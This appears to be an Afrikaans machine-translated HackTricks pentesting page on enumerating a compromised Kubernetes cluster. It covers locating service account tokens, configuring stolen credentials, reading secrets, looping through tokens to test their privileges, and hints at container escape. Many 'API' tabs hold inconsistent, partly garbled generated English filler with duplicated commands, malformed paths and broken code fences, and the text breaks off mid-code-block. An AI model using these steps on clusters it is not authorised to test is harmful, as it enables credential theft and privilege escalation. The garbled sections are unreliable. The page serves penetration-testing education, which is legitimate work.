# Kubernetes Enumerasie

{% hint style="success" %}
Leer & oefen AWS Hack: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hack: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}

## Kubernetes Tokens

Indien jy toegang tot 'n masjien verkry het, mag die gebruiker toegang tot 'n paar Kubernetes-platform h√™. Die token is gewoonlik gele√´ in 'n l√™er wat deur die **omgewingsveranderlike `KUBECONFIG`** of **binne `~/.kube`** aangedui word.

In hierdie l√™er kan jy konfigurasie l√™ers met **tokens en konfigurasies om met die API-bediener te verbind** vind. In hierdie l√™er kan jy ook 'n cache-l√™er met voorheen opgevraagde inligting vind.

Indien jy 'n pod binne 'n Kubernetes-omgewing gekompromitteer het, is daar ander plekke waar jy tokens en inligting oor die huidige K8-omgewing kan vind:

### Diensrekeningtokens

Voordat jy voortgaan, as jy nie weet wat 'n diens in Kubernetes is nie, sou ek voorstel dat jy **hierdie skakel volg en ten minste die inligting oor die Kubernetes-argitektuur lees**.

Geneem van die Kubernetes [dokumentasie](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server):

_"Wanneer jy 'n pod skep, as jy nie 'n diensrekening spesifiseer nie, word dit outomaties toegewys aan die_ verstek _diensrekening in dieselfde naamspasie."_

**Diensrekening** is 'n objek wat deur Kubernetes bestuur word en gebruik word om 'n identiteit vir prosesse wat in 'n pod loop, te voorsien.\
Elke diensrekening het 'n geheim wat daarmee verband hou en hierdie geheim bevat 'n draertoken. Dit is 'n JSON Web Token (JWT), 'n metode om eise veilig tussen twee partye voor te stel.

Gewoonlik **een** van die gids:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

bevat die l√™ers:

* **ca.crt**: Dit is die ca-sertifikaat om Kubernetes-kommunikasies te kontroleer
* **naamspasie**: Dit dui die huidige naamspasie aan
* **token**: Dit bevat die **diens-token** van die huidige pod.

Nou dat jy die token het, kan jy die API-bediener binne die omgewingsveranderlike **`KUBECONFIG`** vind. Vir meer inligting hardloop `(env | set) | grep -i "kuber|kube`**`"`**

Die diensrekeningtoken word onderteken deur die sleutel wat in die l√™er **sa.key** woon en deur **sa.pub** gevalideer word.

Versteklokasie op **Kubernetes**:

* /etc/kubernetes/pki

Versteklokasie op **Minikube**:

* /var/lib/localkube/certs

### Warm Pods

_**Warm pods is**_ pods wat 'n bevoorregte diensrekeningtoken bevat. 'n Bevoorregte diensrekeningtoken is 'n token wat toestemming het om bevoorregte take uit te voer soos die lys van geheime, skep van pods, ens.

## RBAC

Indien jy nie weet wat **RBAC** is nie, **lees hierdie afdeling**.

## Enumerasie Spiekbrief

Om 'n K8s-omgewing te enumereer, het jy 'n paar van hierdie nodig:

* 'n **geldige outentifikasietoken**. In die vorige afdeling het ons gesien waar om vir 'n gebruikerstoken en 'n diensrekeningtoken te soek.
* Die **adres (**_**https://host:port**_**) van die Kubernetes API**. Dit kan gewoonlik in die omgewingsveranderlikes en/of in die kube-konfigurasie-l√™er gevind word.
* **Opsioneel**: Die **ca.crt om die API-bediener te verifieer**. Dit kan in dieselfde plekke gevind word waar die token gevind kan word. Dit is nuttig om die API-bediener se sertifikaat te verifieer, maar deur `--insecure-skip-tls-verify` met `kubectl` of `-k` met `curl` te gebruik, sal jy dit nie nodig h√™ nie.

Met daardie besonderhede kan jy **Kubernetes enumereer**. Indien die **API** om enige rede **toeganklik is** deur die **Internet**, kan jy net daardie inligting aflaai en die platform vanaf jou gasheer enumereer.

Gewoonlik is die **API-bediener egter binne 'n interne netwerk**, daarom sal jy 'n tonnel moet **skep deur die gekompromitteerde masjien** om dit vanaf jou masjien te kan benader, of jy kan die [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) bin√™re l√™er oplaai, of `curl/wget/anything` gebruik om rou HTTP-versoeke aan die API-bediener uit te voer.

### Verskille tussen `lys` en `kry` werkwoorde

Met **`kry`** toestemmings kan jy inligting van spesifieke bates (_`beskryf`-opsie in `kubectl`_) API kry:
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
Indien jy die **`lys`** toestemming het, is jy toegelaat om API-versoeke uit te voer om 'n tipe bate te lys (_`kry` opsie in `kubectl`_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
Indien jy die **`watch`** toestemming het, is jy toegelaat om API-versoeke uit te voer om bates te monitor:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
Hulle maak 'n stroomkonneksie oop wat jou die volledige manifest van 'n Implementering teruggee wanneer dit verander (of wanneer 'n nuwe een geskep word).

{% hint style="danger" %}
Die volgende `kubectl` opdragte dui net aan hoe om die voorwerpe te lys. As jy die data wil bereik, moet jy `describe` in plaas van `get` gebruik.
{% endhint %}

### Gebruik van curl

Van binne 'n peul kan jy verskeie omgewingsveranderlikes gebruik:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
Standaard kan die pod die **kube-api bediener** in die domeinnaam **`kubernetes.default.svc`** **bereik** en jy kan die kube-netwerk sien in **`/etc/resolv.config`** aangesien jy hierdie adres van die kubernetes DNS-bedienaar sal vind (die ".1" van dieselfde reeks is die kube-api eindpunt).
{% endhint %}

### Gebruik kubectl

Met die token en die adres van die API-bedienaar kan jy kubectl of curl gebruik om dit soos hier aangedui te **bereik**:

Standaard kommunikeer die APISERVER met `https://` skema
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> as daar geen `https://` in url is nie, kan jy 'n Fout soos 'n Slegte Versoek kry.

Jy kan 'n [**amptelike kubectl geheuehulp hier**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/) vind. Die doel van die volgende afdelings is om op 'n geordenende wyse verskillende opsies voor te stel om die nuwe K8s wat jy toegang tot verkry het, te ontleed en te verstaan.

Om die HTTP-versoek wat `kubectl` stuur te vind, kan jy die parameter `-v=8` gebruik

#### MitM kubectl - Proksifisering van kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Huidige Konfigurasie

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

As jy daarin geslaag het om sekere gebruikers se geloofsbriewe te steel, kan jy **hulle plaaslik instel** deur iets soos:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Kry Ondersteunde Hulpbronne

Met hierdie inligting sal jy al die dienste ken wat jy kan lys

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
### Kry Huidige Voorregte

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}  
### API
API's kan 'n groot bron van inligting wees tydens die enumerasie van 'n Kubernetes-omgewing. Dit is belangrik om die API-eindpunte te ondersoek vir enige blootgestelde inligting of funksionaliteit wat misbruik kan word.  
Sommige nuttige API-eindpunte om te ondersoek sluit in:
- `/api`
- `/api/v1`
- `/apis`
- `/apis/apps`
- `/apis/extensions`
- `/healthz`
- `/openapi/v2`
- `/swaggerapi`
- `/swaggerapi/api`  
Dit is belangrik om te onthou dat die toegang tot sekere API-eindpunte beperk kan wees deur rolgebaseerde toegangsbeheer (Role-Based Access Control - RBAC) of ander toegangsbeheermetodes.  
{% endtab %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

'n Ander manier om jou voorregte te kontroleer is om die gereedskap te gebruik: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

Jy kan meer leer oor **Kubernetes RBAC** in:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Sodra jy weet watter voorregte** jy het, kyk na die volgende bladsy om uit te vind **of jy hulle kan misbruik** om voorregte te eskaleer:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Kry Ander se rolle

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %} 
### API
API's kan 'n groot bron van inligting wees vir aanvallers. Dit is belangrik om alle beskikbare API-eindpunte te identifiseer en te ondersoek vir enige potensi√´le kwesbaarhede. Dit kan gedoen word deur die dokumentasie van die toepassing te ondersoek, asook deur skandering van die toepassing vir blootgestelde eindpunte. Daarbenewens kan die gebruik van hulpmiddels soos `kubectl` en `kubectrl` help om API-eindpunte te identifiseer en te ondersoek. 
{% endtab %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### Kry benamings

Kubernetes ondersteun **meervoudige virtuele bondels** wat ondersteun word deur dieselfde fisiese bondel. Hierdie virtuele bondels word **benamings** genoem.
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %} 
### API
API's kan 'n groot bron van inligting wees vir aanvallers. Dit is belangrik om alle beskikbare API-eindpunte te identifiseer en te ondersoek vir enige potensi√´le kwesbaarhede. Dit kan gedoen word deur die dokumentasie van die toepassing te ondersoek, asook deur skandering van die toepassing vir blootgestelde eindpunte. Aanvallers kan dikwels API-eindpunte gebruik om toegang te verkry tot sensitiewe inligting of om aanvalle uit te voer. Daarom is dit noodsaaklik om die blootgestelde API-eindpunte te verstaan en te verseker dat hulle behoorlik beskerm word. 
{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
### Kry geheime

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}  
### Kubernetes API Enumeration

#### Kubelet API

The Kubelet API server runs on each node and provides an interface for interacting with the node. It exposes a variety of endpoints that can be useful during enumeration.

- **`/pods`**: List all pods running on the node.
- **`/runningpods`**: List all running pods.
- **`/metrics`**: Exposes resource usage metrics.
- **`/logs`**: Provides access to container logs.

#### Kubernetes API Server

The Kubernetes API server is the primary management point for the cluster. It provides a way to interact with the cluster and perform various operations.

- **`/api`**: The base endpoint for the API server.
- **`/apis`**: Lists all available API groups.
- **`/version`**: Displays the Kubernetes version.
- **`/healthz`**: Checks the health of the API server.

#### Service Account Token

Service account tokens are used to authenticate with the Kubernetes API server. They can be used to perform actions based on the permissions associated with the service account.

- **`/var/run/secrets/kubernetes.io/serviceaccount/token`**: Location of the service account token on a pod.

#### Kubelet Healthz

The `/healthz` endpoint on the Kubelet API server can be used to check the health of the Kubelet itself.

#### Kubelet Logs

Accessing the `/logs` endpoint on the Kubelet API server provides access to the Kubelet logs, which can contain valuable information for enumeration and troubleshooting.

#### Kubelet Metrics Server

The `/metrics` endpoint on the Kubelet API server exposes resource usage metrics, which can be useful for understanding the performance of the node.

#### Kubelet Version

The `/version` endpoint on the Kubelet API server displays the version of the Kubelet running on the node.

#### Kubelet Running Pods

The `/runningpods` endpoint on the Kubelet API server lists all the pods that are currently running on the node.

#### Kubelet Pods

The `/pods` endpoint on the Kubelet API server lists all pods that are running on the node.

#### Kubelet Proxy

The Kubelet API server acts as a proxy to the Kubernetes API server, forwarding requests and responses between the node and the cluster.  
{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

As jy geheime kan lees, kan jy die volgende lyne gebruik om die voorregte wat verband hou met elke token te kry:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Kry Diensrekeninge

Soos bespreek aan die begin van hierdie bladsy **wanneer 'n houer uitgevoer word, word 'n diensrekening gewoonlik daaraan toegewys**. Daarom kan die lys van diensrekeninge, hul regte en waar hulle uitgevoer word, 'n gebruiker moontlik help om voorregte te verhoog.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}  
### API
API's kan 'n groot bron van inligting wees tydens die enumerasie van 'n Kubernetes-omgewing. Dit is belangrik om die API-endpunte te ondersoek vir enige blootgestelde inligting oor dienste, toestande en konfigurasies wat kan help om die aanvalsvlak te bepaal.  
{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
### Kry Implementasies

Die implementasies spesifiseer die **komponente** wat uitgevoer moet word.

{% tabs %}
{% tab title="kubectl" %}
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}  
### Kubernetes API Enumeration

#### Kubelet API

The Kubelet API server runs on each node and provides an interface for interacting with the node. It exposes a variety of endpoints that can be used to gather information about the node and its running pods.

**Enumerating Running Pods**

You can use the following command to list all running pods on a node:

```bash
curl http://<node-ip>:10255/pods/
```

**Enumerating Node Information**

You can retrieve information about the node itself using the following command:

```bash
curl http://<node-ip>:10255/pods/
```

#### Kubernetes API Server

The Kubernetes API server is the primary endpoint for all cluster interactions. It exposes a wide range of functionality for managing the cluster, including creating and updating resources, as well as monitoring the cluster's state.

**Enumerating API Server Endpoints**

You can discover available API server endpoints by sending a request to the following URL:

```bash
curl https://<api-server-ip>/swaggerapi/
```

**Enumerating Cluster Resources**

You can list the available resources in the cluster by sending a request to the following URL:

```bash
curl https://<api-server-ip>/api/v1/
```

**Enumerating Namespaces**

You can retrieve a list of namespaces in the cluster by sending a request to the following URL:

```bash
curl https://<api-server-ip>/api/v1/namespaces/
```

**Enumerating Nodes**

You can get a list of nodes in the cluster by sending a request to the following URL:

```bash
curl https://<api-server-ip>/api/v1/nodes/
```

**Enumerating Persistent Volumes**

You can list the persistent volumes in the cluster by sending a request to the following URL:

```bash
curl https://<api-server-ip>/api/v1/persistentvolumes/
```

**Enumerating Storage Classes**

You can retrieve a list of storage classes in the cluster by sending a request to the following URL:

```bash
curl https://<api-server-ip>/apis/storage.k8s.io/v1/storageclasses/
```

**Enumerating Custom Resource Definitions**

You can list custom resource definitions in the cluster by sending a request to the following URL:

```bash
curl https://<api-server-ip>/apis/apiextensions.k8s.io/v1beta1/customresourcedefinitions/
```

**Enumerating Roles**

You can retrieve a list of roles in the cluster by sending a request to the following URL:

```bash
curl https://<api-server-ip>/apis/rbac.authorization.k8s.io/v1/roles/
```

**Enumerating Role Bindings**

You can list role bindings in the cluster by sending a request to the following URL:

```bash
curl https://<api-server-ip>/apis/rbac.authorization.k8s.io/v1/rolebindings/
```

**Enumerating Service Accounts**

You can get a list of service accounts in the cluster by sending a request to the following URL:

```bash
curl https://<api-server-ip>/api/v1/serviceaccounts/
```

**Enumerating Secrets**

You can list secrets in the cluster by sending a request to the following URL:

```bash
curl https://<api-server-ip>/api/v1/secrets/
```

**Enumerating Config Maps**

You can retrieve a list of config maps in the cluster by sending a request to the following URL:

```bash
curl https://<api-server-ip>/api/v1/configmaps/
```

**Enumerating Deployments**

You can get a list of deployments in the cluster by sending a request to the following URL:

```bash
curl https://<api-server-ip>/apis/apps/v1/deployments/
```

**Enumerating Services**

You can list services in the cluster by sending a request to the following URL:

```bash
curl https://<api-server-ip>/api/v1/services/
```

**Enumerating Ingresses**

You can retrieve a list of ingresses in the cluster by sending a request to the following URL:

```bash
curl https://<api-server-ip>/apis/networking.k8s.io/v1/ingresses/
```

**Enumerating Network Policies**

You can get a list of network policies in the cluster by sending a request to the following URL:

```bash
curl https://<api-server-ip>/apis/networking.k8s.io/v1/networkpolicies/
```

**Enumerating Pod Security Policies**

You can list pod security policies in the cluster by sending a request to the following URL:

```bash
curl https://<api-server-ip>/apis/policy/v1beta1/podsecuritypolicies/
```

**Enumerating Cluster Roles**

You can retrieve a list of cluster roles in the cluster by sending a request to the following URL:

```bash
curl https://<api-server-ip>/apis/rbac.authorization.k8s.io/v1/clusterroles/
```

**Enumerating Cluster Role Bindings**

You can list cluster role bindings in the cluster by sending a request to the following URL:

```bash
curl https://<api-server-ip>/apis/rbac.authorization.k8s.io/v1/clusterrolebindings/
```

**Enumerating Events**

You can get a list of events in the cluster by sending a request to the following URL:

```bash
curl https://<api-server-ip>/api/v1/events/
```

**Enumerating Component Status**

You can retrieve the status of cluster components by sending a request to the following URL:

```bash
curl https://<api-server-ip>/api/v1/componentstatuses/
```

**Enumerating Metrics**

You can retrieve cluster metrics by sending a request to the following URL:

```bash
curl https://<api-server-ip>/apis/metrics.k8s.io/v1beta1/
```

**Enumerating Logs**

You can access container logs by sending a request to the following URL:

```bash
curl https://<api-server-ip>/api/v1/namespaces/<namespace>/pods/<pod-name>/log
```

**Enumerating Exec**

You can execute commands inside a container by sending a request to the following URL:

```bash
curl -X POST https://<api-server-ip>/api/v1/namespaces/<namespace>/pods/<pod-name>/exec
```

**Enumerating Attach**

You can attach to a running container by sending a request to the following URL:

```bash
curl -X POST https://<api-server-ip>/api/v1/namespaces/<namespace>/pods/<pod-name>/attach
```

**Enumerating Port Forward**

You can forward ports from a pod by sending a request to the following URL:

```bash
curl -X POST https://<api-server-ip>/api/v1/namespaces/<namespace>/pods/<pod-name>/portforward
```

**Enumerating Proxy**

You can proxy requests to a pod by sending a request to the following URL:

```bash
curl -X GET https://<api-server-ip>/api/v1/namespaces/<namespace>/pods/<pod-name>/proxy
```

**Enumerating Watch**

You can watch for changes to a resource by sending a request to the following URL:

```bash
curl -H "Connection: upgrade" -H "Upgrade: websocket" -H "Host: <api-server-ip>" https://<api-server-ip>/api/v1/namespaces/<namespace>/pobjects/<pod-name>/watch
```

#### Summary

Kubernetes API enumeration is a critical phase in the reconnaissance process of a Kubernetes cluster. By identifying and enumerating the available resources and endpoints, an attacker can gain valuable insights into the cluster's configuration and potentially discover misconfigurations or vulnerabilities that can be exploited.  
{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
### Kry Skuite

Die Skuite is die werklike **houers** wat sal **hardloop**.

{% tabs %}
{% tab title="kubectl" %}
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}  
### Kubernetes API Enumeration

#### Kubelet API

The Kubelet API can be accessed directly on port 10250. You can use tools like `curl` or `wget` to interact with the API and gather information about the Kubernetes nodes.

```bash
curl http://<node-ip>:10250/pods
```

#### Kubernetes API Server

The Kubernetes API server is the primary management point for the cluster. You can interact with this API using tools like `kubectl` or by sending HTTP requests directly.

```bash
kubectl get pods
```

#### Service Account Token

Service account tokens are used by pods to authenticate with the Kubernetes API server. These tokens can sometimes be leaked and abused by attackers to gain unauthorized access.

#### RBAC Policies

Role-Based Access Control (RBAC) policies define what actions are allowed within a Kubernetes cluster. Enumerating RBAC policies can help identify potential security misconfigurations.

#### Cloud Metadata Service

If the Kubernetes cluster is running on a cloud provider, the cloud metadata service can provide valuable information about the underlying infrastructure. Attackers can abuse this information for further exploitation.

#### etcd

etcd is a distributed key-value store used by Kubernetes to store cluster data. Access to etcd can reveal sensitive information and potentially lead to a full compromise of the cluster.

```bash
etcdctl get / --prefix --keys-only
```

#### Network Policies

Network policies in Kubernetes control traffic flow between pods. Understanding the network policies in place can help attackers plan lateral movement within the cluster.

#### Insecure Configurations

Misconfigured settings in Kubernetes can lead to security vulnerabilities. Enumerating these insecure configurations is crucial for securing the cluster.

```bash
kubectl get pods --all-namespaces -o=jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[*].image}{"\n"}{end}'
``json
```  
{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
### Kry Dienste

Kubernetes **dienste** word gebruik om 'n diens bloot te stel op 'n spesifieke poort en IP-adres (wat as 'n vragbalansier na die peule wat werklik die diens aanbied, sal optree). Dit is interessant om te weet waar jy ander dienste kan vind om te probeer aanval.

{% tabs %}
{% tab title="kubectl" %}
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %} 
### API Enumerasie

API's kan 'n groot aanvalsoppervlak skep vir aanvallers om te misbruik. Hier is 'n paar maniere om API-inligting te ontleed en te ondersoek:

1. **API-eindpunte**: Identifiseer en ontleed alle blootgestelde API-eindpunte.
2. **API-dokumentasie**: Soek na en ontleed enige beskikbare API-dokumentasie vir inligting.
3. **API-verkeer**: Monitor en analiseer API-verkeer vir insigte oor funksionaliteit en dataformaat.
4. **Foutkodes**: Ondersoek foutkodes vir moontlike inligting oor API-funksionaliteit en -kwessies.
5. **Verborgen eindpunte**: Identifiseer en ondersoek enige moontlike verborge API-eindpunte.
6. **API-autentisering**: Ondersoek die gebruikte API-autentiseringsmetodes vir swakheid en moontlike aanvalle.
{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
### Kry nodes

Kry al die **nodes wat binne die groep geconfigureer is**.

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %}  
### API Enumerasie

API enumerasie is 'n kritieke stap in die kubernetes pentesting proses. Dit behels die identifisering van blootgestelde API-eindpunte en die analise van hul funksionaliteit en toegangsniveaus. Hierdie inligting kan gebruik word om potensi√´le aanvalsvlakke te identifiseer en om 'n aanvalsvektor te ontwikkel vir die verdere ondersoek van die kubernetes-omgewing.  
{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### Kry DaemonSets

**DaemonSets** maak dit moontlik om te verseker dat 'n **spesifieke pod op al die nodes** van die groep (of op die gekose nodes) hardloop. As jy die DaemonSet verwyder, sal die pods wat deur dit bestuur word, ook verwyder word.
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %}  
### Kubernetes Enumeration

#### Service Accounts

Service accounts are used by pods to interact with the Kubernetes API. They are mounted as volumes inside the pod and provide necessary credentials to authenticate with the API server.

To enumerate service accounts in a Kubernetes cluster, you can use the following command:

```bash
kubectl get serviceaccounts --all-namespaces
```

This command will list all service accounts in all namespaces of the cluster.

#### Secrets

Secrets in Kubernetes are used to store sensitive information such as passwords, OAuth tokens, and SSH keys. To enumerate secrets in a Kubernetes cluster, you can use the following command:

```bash
kubectl get secrets --all-namespaces
```

This command will list all secrets in all namespaces of the cluster.

#### ConfigMaps

ConfigMaps in Kubernetes are used to store configuration data in key-value pairs. To enumerate ConfigMaps in a Kubernetes cluster, you can use the following command:

```bash
kubectl get configmaps --all-namespaces
```

This command will list all ConfigMaps in all namespaces of the cluster.

#### RBAC Permissions

Role-Based Access Control (RBAC) in Kubernetes defines what actions are allowed within the cluster based on roles assigned to users. To enumerate RBAC permissions in a Kubernetes cluster, you can use the following command:

```bash
kubectl get roles,rolebindings,clusterroles,clusterrolebindings --all-namespaces
``json
This command will list all roles, role bindings, cluster roles, and cluster role bindings in all namespaces of the cluster.
```  
{% endtab %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
### Kry cronjob

Kroniese take maak dit moontlik om met behulp van 'n crontab soortgelyke sintaksis die begin van 'n houer te skeduleer wat 'n sekere aksie sal uitvoer.
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %} 
### Kubernetes API Enumeration

#### Kubelet API

The Kubelet API server runs on each node and provides an interface for interacting with the node. It exposes a variety of endpoints that can be useful during enumeration.

- **/pods**: List all pods running on the node.
- **/runningpods**: List all running pods.
- **/metrics**: Expose metrics about the node.
- **/spec**: Display information about the node.
- **/logs**: Access logs from pods running on the node.

#### Kubernetes API Server

The Kubernetes API server is the frontend for the Kubernetes control plane. It exposes a ton of functionality that can be useful during enumeration.

- **/api/v1**: The core API group.
- **/apis**: List all available API groups.
- **/version**: Display the Kubernetes version.
- **/healthz**: Check the health of the API server.
- **/openapi/v2**: Expose the OpenAPI specification.

#### Service Account Tokens

Service account tokens are used by pods to authenticate with the Kubernetes API server. They can be abused if leaked or stolen.

- **/var/run/secrets/kubernetes.io/serviceaccount/token**: Location of the service account token on the node.
- **/var/run/secrets/kubernetes.io/serviceaccount/ca.crt**: Location of the CA certificate used to verify the API server's certificate.

#### Cloud Metadata

If the Kubernetes cluster is running on a cloud provider, you can access cloud metadata to gather more information about the environment.

- **http://169.254.169.254**: Common endpoint for accessing cloud metadata.
- **http://metadata.google.internal**: Google Cloud metadata endpoint.
- **http://metadata.azure.com**: Azure metadata endpoint.
- **http://169.254.169.254/metadata/v1/maintenance**: AWS metadata endpoint for maintenance information.

#### Summary

During Kubernetes enumeration, exploring the Kubelet API, Kubernetes API server, service account tokens, and cloud metadata can provide valuable information for further exploitation and privilege escalation.
{% endtab %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
### Kry configMap

configMap bevat altyd baie inligting en konfigurasie l√™er wat voorsien word aan programme wat in die kubernetes loop. Gewoonlik kan jy baie wagwoorde, geheime, tokens vind wat gebruik word om te koppel en te valideer na ander interne/eksterne dienste.

{% tabs %}

{% tab title="kubectl" %}
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %} 
### API Enumerasie

API enumerasie is 'n kritieke stap in die kubernetes pentesting proses. Dit behels die identifisering van blootgestelde API-eindpunte en die analise van hul funksionaliteit en toegangsniveaus. Hierdie inligting kan gebruik word om potensi√´le aanvalsvlakke te identifiseer en om 'n beter begrip van die kubernetes-omgewing te verkry. 

#### Gereedskap vir API Enumerasie

Daar is verskeie gereedskap beskikbaar vir API enumerasie in 'n kubernetes-omgewing. Sommige van die gewilde gereedskap sluit in `kubectl`, `kube-hunter`, en `kube-api-server`. Hierdie gereedskap kan gebruik word om API-eindpunte te ondersoek, hul funksionaliteit te analiseer, en potensi√´le veiligheidsrisiko's te identifiseer. 

#### API Enumerasie Tegnieke

Tydens die API enumerasie proses kan verskeie tegnieke gebruik word om inligting oor die API-eindpunte te verkry. Hierdie tegnieke sluit in die gebruik van `HTTP-verwittigings`, `HTTP-aanvrae`, en `API-dokumentasie`. Deur hierdie tegnieke te gebruik, kan 'n pentester 'n volledige prentjie van die API-omgewing kry en potensi√´le veiligheidsrisiko's identifiseer. 
{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
### Kry "alles"

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
### **Kry Pods verbruik**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
### Ontsnapping uit die houer

Indien jy in staat is om nuwe houers te skep, kan jy moontlik daaruit ontsnap na die node. Om dit te doen, moet jy 'n nuwe houer skep deur 'n yaml-l√™er te gebruik, oorskakel na die geskepte houer en dan chroot na die node se stelsel. Jy kan reeds bestaande houers as verwysing vir die yaml-l√™er gebruik aangesien hulle bestaande beelde en paaie vertoon.
```bash
